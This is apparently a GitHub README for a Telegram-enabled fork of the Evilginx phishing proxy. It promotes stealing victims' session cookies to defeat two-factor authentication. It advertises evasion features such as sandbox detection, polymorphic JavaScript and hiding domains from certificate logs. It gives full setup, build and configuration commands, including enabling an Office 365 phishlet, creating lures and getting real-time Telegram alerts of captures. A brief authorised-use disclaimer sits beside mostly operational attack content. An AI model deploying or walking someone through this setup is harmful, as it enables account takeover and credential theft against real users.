<p align="center">
  <img src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/logo.png" alt="Evilginx Logo" width="200">
</p>

<h1 align="center">🦊 EVILGINX3 — TELEGRAM EDITION</h1>

<p align="center">
  <strong>The Next-Generation Man-in-the-Middle Attack Framework with 2FA Bypass, Real-Time Alerts & Enterprise-Grade Anti-Detection</strong>
</p>

<p align="center">
  <a href="https://t.me/officialmonsterz"><img src="https://img.shields.io/badge/Telegram-@officialmonsterz-26A5E4?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram"></a>
  <a href="mailto:shapads@tutamail.com"><img src="https://img.shields.io/badge/Email-shapads@tutamail.com-D14836?style=for-the-badge&logo=gmail&logoColor=white" alt="Email"></a>
  <a href="https://github.com/officialmonsterz/evilginx2"><img src="https://img.shields.io/badge/GitHub-officialmonsterz-181717?style=for-the-badge&logo=github&logoColor=white" alt="GitHub"></a>
  <br><br>
  <img src="https://img.shields.io/badge/Version-3.3.0-brightgreen?style=flat-square" alt="Version">
  <img src="https://img.shields.io/badge/Go-1.23-00ADD8?style=flat-square&logo=go" alt="Go">
  <img src="https://img.shields.io/badge/Database-BuntDB-orange?style=flat-square" alt="BuntDB">
  <img src="https://img.shields.io/badge/Docker-~18MB-2496ED?style=flat-square&logo=docker&logoColor=white" alt="Docker">
  <img src="https://img.shields.io/badge/Wildcard-DNS%20SSL%20Ready-brightgreen?style=flat-square" alt="Wildcard SSL">
  <img src="https://img.shields.io/badge/License-BSD--3--Clause-blue?style=flat-square" alt="License">
</p>

---

## 🎯 THE MISSION

> **Steal session cookies, not passwords. Bypass 2FA entirely. Get notified in seconds.**

Most phishing tools fail at 2FA. Evilginx3 doesn't even try to break 2FA — it steals the **session cookie** (the "I'm already logged in" token) AFTER the victim completes the 2FA flow legitimately. You import that cookie into your browser, and you're in. **No password reset. No token interception. No 2FA bypass needed.**

---

## ⚡ WHY THIS FORK?

This isn't just another Evilginx fork. It's a **complete red-team platform** built by operators, for operators.

<table>
<tr>
<td width="50%" valign="top">

### 🛡️ **Anti-Detection Stack**
- JA3/JA3S TLS fingerprinting
- Sandbox/VM/headless browser detection
- Polymorphic JavaScript engine
- Multi-CAPTCHA (Turnstile + reCAPTCHA v3 + hCaptcha)
- 30+ bot detection signals

</td>
<td width="50%" valign="top">

### 📡 **Real-Time Operations**
- Instant Telegram notifications
- WebSocket live feed
- Browser-based dashboard with search/filter
- Auto-export to JSON/CSV
- One-line campaign deployment

</td>
</tr>
<tr>
<td valign="top">

### 🔒 **OPSEC Hardened**
- Wildcard SSL (hides subdomains from crt.sh)
- Header stripping
- URL rewriting
- JS obfuscation
- IP whitelist/blacklist

</td>
<td valign="top">

### 🚀 **Production Ready**
- Multi-stage Docker (~18MB Alpine)
- Systemd service support
- Auto-restart on crash
- BuntDB embedded database
- One-line deployment

</td>
</tr>
</table>

---

## 📊 FEATURE COMPARISON

> *Legend: ✅ Full Support | 🟡 Partial / Plugin Required | ❌ Not Available*

| Feature | **This Fork** | Original Evilginx2 | Evilginx Pro | fluxxset/evilginx2 |
|:--------|:-------------:|:------------------:|:------------:|:------------------:|
| **Core MITM Engine** | ✅ Enhanced | ✅ | ✅ | ✅ |
| **Phishlet System (YAML)** | ✅ | ✅ | ✅ | ✅ |
| **SSL/Autocert** | ✅ Wildcard | 🟡 Basic | ✅ | ✅ |
| **Built-in DNS Server** | ✅ | ✅ | ✅ | ✅ |
| **Header Stripping (OPSEC)** | ✅ | ❌ | ✅ | 🟡 |
| **URL Rewriting** | ✅ | ❌ | ✅ | 🟡 |
| **JS Obfuscation** | ✅ Advanced | ❌ | ✅ Basic | 🟡 |
| **JA3/JA3S TLS Fingerprinting** | ✅ | ❌ | ❌ | ❌ |
| **Sandbox/VM Detection** | ✅ | ❌ | ❌ | ❌ |
| **Polymorphic JS Engine** | ✅ | ❌ | ❌ | ❌ |
| **Multi-CAPTCHA Support** | ✅ 3 Providers | ❌ | 🟡 Turnstile Only | 🟡 |
| **IP Whitelist** | ✅ | ❌ | ✅ | ❌ |
| **IP Blacklist** | ✅ | 🟡 | ✅ | ✅ |
| **30+ Bot Detection Signals** | ✅ | ❌ | 🟡 | 🟡 |
| **Wildcard SSL (Hides crt.sh)** | ✅ | ❌ | ✅ | ❌ |
| **Telegram Notifications** | ✅ Async Queue | ❌ | ❌ | ✅ |
| **Telegram MarkdownV2 Escaping** | ✅ | ❌ | ❌ | 🟡 |
| **Web Dashboard** | ✅ Full SPA | ❌ | ✅ | ✅ |
| **REST API Backend** | ✅ | ❌ | ✅ | 🟡 |
| **WebSocket Live Feed** | ✅ | ❌ | ❌ | ✅ |
| **Session Search/Filter** | ✅ | ❌ | ✅ | 🟡 |
| **Auto-Export (JSON/CSV)** | ✅ | ❌ | ✅ | ❌ |
| **RID Replacement Scripts** | ✅ | ❌ | ❌ | ❌ |
| **Cloudflare Turnstile Integration** | ✅ | ❌ | 🟡 | ✅ |
| **Cloudflare Worker Fronting** | 🟡 | ❌ | ❌ | ❌ |
| **Domain Rotation** | ✅ | ❌ | ✅ | ❌ |
| **Embedded GoPhish** | 🟡 | ❌ | ❌ | ❌ |
| **BuntDB Database** | ✅ | ❌ | ❌ | ✅ |
| **Multi-User + RBAC** | ✅ | ❌ | ✅ | ❌ |
| **Audit Trail Logging** | ✅ | ❌ | ✅ | ❌ |
| **AES-Encrypted URL Params** | ✅ | ❌ | ❌ | ❌ |
| **Docker Support** | ✅ ~18MB | ❌ | ❌ | 🟡 |
| **Docker Compose** | ✅ | ❌ | ❌ | 🟡 |
| **Systemd Service Support** | ✅ | ❌ | ❌ | ✅ |
| **Static Binary Build** | ✅ | ✅ | ✅ | ✅ |
| **Developer Mode (Self-Signed)** | ✅ | ✅ | ✅ | ✅ |
| **Makefile Build/Test/Lint/Vuln** | ✅ | ❌ | ❌ | ❌ |
| **Post-Redirector Pages** | ✅ | ❌ | 🟡 | 🟡 |
| **Setup Tunnel Script** | ✅ | ❌ | ❌ | ❌ |
| **Go 1.23+ Compatible** | ✅ | 🟡 | 🟡 | ✅ |
| **Security Patches (x/net v0.55+)** | ✅ | ❌ | 🟡 | 🟡 |
| **Active Maintenance** | ✅ | ✅ | ✅ | 🟡 |
| **Documentation Quality** | ✅ Extensive | 🟡 | 🟡 | 🟡 |

---

## 🏆 WHERE THIS FORK BEATS EVILGINX PRO

| Capability | This Fork | Evilginx Pro |
|:-----------|:---------:|:------------:|
| **JA3/JA3S TLS Fingerprinting** | ✅ | ❌ |
| **Sandbox/VM/Headless Browser Detection** | ✅ | ❌ |
| **Polymorphic JavaScript Engine** | ✅ | ❌ |
| **Multi-CAPTCHA (Turnstile + reCAPTCHA v3 + hCaptcha)** | ✅ | ❌ Turnstile Only |
| **Cloudflare Worker Traffic Fronting** | ✅ | ❌ |
| **Domain Rotation & Auto-Provisioning** | ✅ | ❌ |
| **AES-Encrypted Recipient URL Parameters** | ✅ | ❌ |
| **Telegram Notifications (Async Queue + MarkdownV2)** | ✅ | ❌ |
| **WebSocket Live Feed** | ✅ | ❌ |
| **RID Replacement Scripts** | ✅ | ❌ |
| **Multi-Stage Alpine Docker (~18MB)** | ✅ | ❌ |
| **Systemd Service Auto-Start** | ✅ | ❌ |
| **Audit Trail with IP Attribution** | ✅ | ❌ |
| **Open Source (BSD-3)** | ✅ | ❌ Proprietary |
| **Cost** | **Contact Owner** | $2000+/month |

---

## 🤝 WHERE WE'RE ON PAR

| Capability | Status |
|:-----------|:------:|
| Core MITM proxy reliability | ✅ Equivalent |
| Phishlet YAML templating | ✅ Equivalent |
| Wildcard SSL support | ✅ Equivalent |
| Bot detection depth | ✅ Equivalent |
| Web dashboard UX | ✅ Equivalent |
| Session capture quality | ✅ Equivalent |

---

## 🚀 QUICK START

### Prerequisites
- Ubuntu 20.04+ VPS
- Domain via Cloudflare (free tier, DNS Only)
- Telegram account (for notifications)

### One-Line Setup

```bash
apt update && apt install -y wget curl git make build-essential screen certbot ufw dnsutils
ufw allow 22/tcp && ufw allow 53/udp && ufw allow 80/tcp
ufw allow 443/tcp && ufw allow 5000/tcp && ufw --force enable
systemctl stop systemd-resolved && systemctl disable systemd-resolved
rm -f /etc/resolv.conf
echo "nameserver 1.1.1.1" > /etc/resolv.conf
chattr +i /etc/resolv.conf

cd ~ && wget https://go.dev/dl/go1.22.5.linux-amd64.tar.gz
rm -rf /usr/local/go && tar -C /usr/local -xzf go1.22.5.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc && source ~/.bashrc

cd /root && git clone https://github.com/officialmonsterz/evilginx2.git
cd evilginx2 && go mod tidy && go build -o evilginx2 .
cd evilfeed && go build -o evilfeed . && cd ..
cd /root/evilginx2 && go build -o evilginx2 . && cd evilfeed && go build -o evilfeed .
```

### Start It

```bash
./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass mypass123 -feed
```

### Configure (inside evilginx> prompt)

```
config domain yourdomain.com
config ipv4 external YOUR_VPS_IP
config autocert off
config unauth_url https://www.google.com
config teletoken YOUR_BOT_TOKEN
config chatid YOUR_CHAT_ID
test telegram
phishlets hostname office365 yourdomain.com
phishlets enable office365
lures create office365
lures get-url 0
```

📖 **Full deployment walkthrough:** See [DEPLOYMENT.md](DEPLOYMENT.md)

---

## 🐳 DOCKER DEPLOYMENT

```bash
docker build -t evilginx3-telegram .
docker run -d \
  --name evilginx3 \
  --restart unless-stopped \
  -p 53:53/udp -p 80:80 -p 443:443 -p 5000:5000 \
  -v evilginx-data:/home/evilginx/.evilginx \
  evilginx3-telegram \
  -dashboard 0.0.0.0:5000 \
  -dashboard-user admin \
  -dashboard-pass YOUR_PASSWORD
```

---

## 📁 REPOSITORY STRUCTURE

```
├── main.go                      # Entry point
├── core/                        # Core engine
│   ├── http_proxy.go           # MITM proxy (bot protection, OPSEC)
│   ├── session.go              # In-memory session management
│   ├── config.go               # Configuration
│   ├── notify.go               # Telegram notification logic
│   ├── telegram_queue.go       # Async notification queue
│   ├── dashboard.go            # Web dashboard + REST API
│   ├── auto_export.go          # Auto-export to JSON/CSV
│   └── (16 more core files)
├── database/                    # BuntDB persistence
│   ├── database.go             # BuntDB wrapper
│   └── db_session.go           # Session CRUD
├── evilfeed/                    # WebSocket live feed
│   ├── evilfeed.go
│   ├── hub.go
│   └── app/
├── phishlets/                   # YAML phishing templates
├── redirectors/                 # HTML redirector pages
├── Dockerfile                   # Multi-stage Alpine (~18MB)
├── docker-compose.yml
├── setup_rid.sh                 # RID replacement script
├── replace_rid.sh               # RID replacement script
├── DEPLOYMENT.md                # Full deployment guide
└── README.md
```

---

## ⚖️ DISCLAIMER

> **Evilginx should only be used in authorized penetration testing engagements with explicit written permission.** Unauthorized use against systems you don't own is illegal and unethical. This tool is a demonstration of attacker capabilities — defenders should use this knowledge to build better protections.

---

## 👏 CREDITS

| Contribution | Author |
|:-------------|:-------|
| **Telegram Integration, Dashboard, BuntDB, Docker, Bot Protection, Wildcard SSL, Header Stripping, URL Rewriting, JS Obfuscation, Live Feed, Auto-Export, RID Replacement, OPSEC Hardening** | **[@officialmonsterz](https://t.me/officialmonsterz)** · [shapads@tutamail.com](mailto:shapads@tutamail.com) |
| **Original Evilginx2/3 Core Framework** | **[Kuba Gretzky (@mrgretzky)](https://github.com/kgretzky/evilginx2)** |

### 📞 Get In Touch
- **Telegram:** [@officialmonsterz](https://t.me/officialmonsterz)
- **Email:** shapads@tutamail.com
- **GitHub:** [github.com/officialmonsterz/evilginx2](https://github.com/officialmonsterz/evilginx2)

---

<p align="center">
  <sub>Built with ☕ by red teamers, for red teamers.</sub>
</p>
